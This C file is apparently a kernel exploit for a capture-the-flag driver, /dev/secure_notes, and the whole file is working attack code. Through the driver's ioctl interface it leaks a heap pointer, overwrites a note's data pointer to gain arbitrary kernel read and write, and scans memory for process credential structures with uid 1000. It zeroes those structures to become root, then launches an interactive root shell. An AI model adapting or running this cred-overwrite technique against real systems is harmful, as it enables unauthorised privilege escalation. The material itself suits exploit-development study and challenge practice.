#include <stdint.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>

void setup(void);
uint64_t create(uint32_t idx, uint32_t size, char* data);
void get(uint32_t idx, uint64_t inToken, uint32_t size, char* data);
void update(uint32_t idx, uint64_t inToken, uint32_t size, char* data);
void delete(uint32_t idx, uint64_t inToken);

typedef struct{
    uint32_t idx;
    char* inData;
    uint32_t inSize;
    char* outData;
    uint32_t outSize;
    uint64_t* token;
} UserRequest;

int fd = 0; // device fd
uint8_t CredStructFinded = 0;

void run_sh(void)
{
	pid_t pid = -1;
	char *args[] = {
		"/bin/sh",
		"-i",
		NULL
	};
	int status = 0;

	pid = fork();

	if (pid < 0) {
		perror("[-] fork()");
		return;
	}

	if (pid == 0) {
		execve("/bin/sh", args, NULL); /* Should not return */
		perror("[-] execve");
		exit(EXIT_FAILURE);
	}

	if (wait(&status) < 0)
		perror("[-] wait");
}

int main() {
    setup();

    // create first chunk and second chunk
    char* data = (char*) malloc(32);
    memset(data, 0, 32);
    memcpy(data, "aaaa", 4);
    uint64_t chunk1 = create(1, 32, data); // size 32 is to create data chunk in same slub-cache when Note struct is placed
    memcpy(data, "bbbb", 4);
    uint64_t chunk2 = create(2, 32, data);
    memcpy(data, "cccc", 4);
    uint64_t chunk3 = create(3, 176, data);

    // get heap pointer
    uint8_t* leak = (uint8_t*) malloc(512);
    get(2, chunk2, 512, leak);
    uint64_t heap_leak = *(uint64_t*)(leak + 8 * 5);
    printf("{+} Heap leak: 0x%llx\n", heap_leak);

    // overwrite second chunk data pointer
    char* payload = (char*) malloc(64);
    uint8_t* out = (uint8_t*) malloc(512);

    memset(payload, 0x61, 32);
    *(uint64_t*)(payload + 32) = 0x3;

    // in positive direction
    for (uint32_t off = 0; off < 0xffffff; off += 0x200) {
        uint64_t addr = heap_leak + off;
        *(uint64_t*)(payload+40) = addr;
        if (addr % 0x100000 == 0) {
            printf("{..} addr = 0x%llx\n", addr);
        }
        
        update(2, chunk2, 48, payload);
        memset(out, 0, 512);
        get(3, chunk3, 512, out);

        int sOff = find_task_struct(out);

        if (CredStructFinded) {
            // rewrite to correct address
            uint64_t CorrectAddr = addr + sOff;
            *(uint64_t*)(payload+40) = CorrectAddr;
            update(2, chunk2, 48, payload);

            // overwrite struct
            uint32_t* StructOverwritePayload = (uint32_t*) malloc(sizeof(uint32_t) * 9);
            memset(StructOverwritePayload, 0, sizeof(uint32_t) * 9);
            update(3, chunk3, sizeof(uint32_t) * 9, StructOverwritePayload);
            free(StructOverwritePayload);

            printf("{+} Cred struct on addr {0x%llx} overwrited!\n", CorrectAddr);
            CredStructFinded = 0;
            //delete(1, chunk1);
        }
    }

    // in negative direction
    for (uint32_t off = 0; off < 0xffffff; off += 0x200) {
        uint64_t addr = heap_leak - off;
        *(uint64_t*)(payload+40) = addr;
        if (addr % 0x100000 == 0) {
            printf("{..} addr = 0x%llx\n", addr - off);
        }

        update(2, chunk2, 48, payload);
        memset(out, 0, 512);
        get(3, chunk3, 512, out);

        int sOff = find_task_struct(out);

        if (CredStructFinded) {
            // rewrite to correct address
            uint64_t CorrectAddr = addr + sOff;
            *(uint64_t*)(payload+40) = CorrectAddr;
            update(2, chunk2, 48, payload);

            // overwrite struct
            uint32_t* StructOverwritePayload = (uint32_t*) malloc(sizeof(uint32_t) * 8);
            memset(StructOverwritePayload, 0, sizeof(uint32_t) * 8);
            update(3, chunk3, sizeof(uint32_t) * 8, StructOverwritePayload);
            free(StructOverwritePayload);

            printf("{+} Cred struct overwriteds!\n");
            CredStructFinded = 0;
        }
    }

    run_sh();
    close(fd);
    return 0;
};


int find_task_struct(uint8_t* out) {
    for (int i = 0; i < 512; i++) {
        if (*(uint32_t*)(out+i) == 0x3e8 &&
            *(uint32_t*)(out+i+4) == 0x3e8 &&
            *(uint32_t*)(out+i+8) == 0x3e8 &&
            *(uint32_t*)(out+i+12) == 0x3e8 &&
            *(uint32_t*)(out+i+16) == 0x3e8 &&
            *(uint32_t*)(out+i+20) == 0x3e8 &&
            *(uint32_t*)(out+i+20) == 0x3e8 &&
            *(uint32_t*)(out+i+20) == 0x3e8 )
        {
            CredStructFinded = 1;
            return i;
        }
    }
}

uint64_t create(uint32_t idx, uint32_t size, char* data) {
    uint64_t* token = (uint64_t*) malloc(sizeof(uint64_t));

    // create request object
    UserRequest* req = (UserRequest*) malloc(sizeof(UserRequest));
    req->idx = idx;
    req->inSize = size;
    req->inData = data;
    req->outData = NULL;
    req->outSize = 0;
    req->token = token;

    int err = ioctl(fd, 0x1001, req);
    //printf("{+} create, err = %d\n", err);
    //printf("{+} create, access token = %lu\n", *token);
    uint64_t retToken = *token;
    free(token);
    free(req);

    return retToken;
};

void get(uint32_t idx, uint64_t inToken, uint32_t size, char* data) {

    uint64_t* token = (uint64_t*) malloc(sizeof(uint64_t));
    *token = inToken;

    // create request object
    UserRequest* req = (UserRequest*) malloc(sizeof(UserRequest));
    req->idx = idx;
    req->inSize = 0;
    req->inData = 0;
    req->outData = data;
    req->outSize = size;
    req->token = token;

    int err = ioctl(fd, 0x2002, req);
    //printf("{+} get, err = %d\n", err);
    //printf("{+} get, data = %s\n", data);
    free(req);
    free(token);
};

void update(uint32_t idx, uint64_t inToken, uint32_t size, char* data) {
    uint64_t* token = (uint64_t*) malloc(sizeof(uint64_t));
    *token = inToken;

    // create request object
    UserRequest* req = (UserRequest*) malloc(sizeof(UserRequest));
    req->idx = idx;
    req->inSize = size;
    req->inData = data;
    req->outData = 0;
    req->outSize = 0;
    req->token = token;

    int err = ioctl(fd, 0x3003, req);
    //printf("{+} update, err = %d\n", err);
    free(req);
};

void delete(uint32_t idx, uint64_t inToken) {
    uint64_t* token = (uint64_t*) malloc(sizeof(uint64_t));
    *token = inToken;

    // create request object
    UserRequest* req = (UserRequest*) malloc(sizeof(UserRequest));
    req->idx = idx;
    req->inSize = 0;
    req->inData = 0;
    req->outData = 0;
    req->outSize = 0;
    req->token = token;

    int err = ioctl(fd, 0x4004, req);
    //printf("{+} delete, err = %d\n", err);
    free(token);
    free(req);
};


void setup(void) {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    fd = open("/dev/secure_notes", 0);

    if (fd < 0) {
        printf("{-} Error in device open, err = %d\n", fd);
        exit(0);
    }
};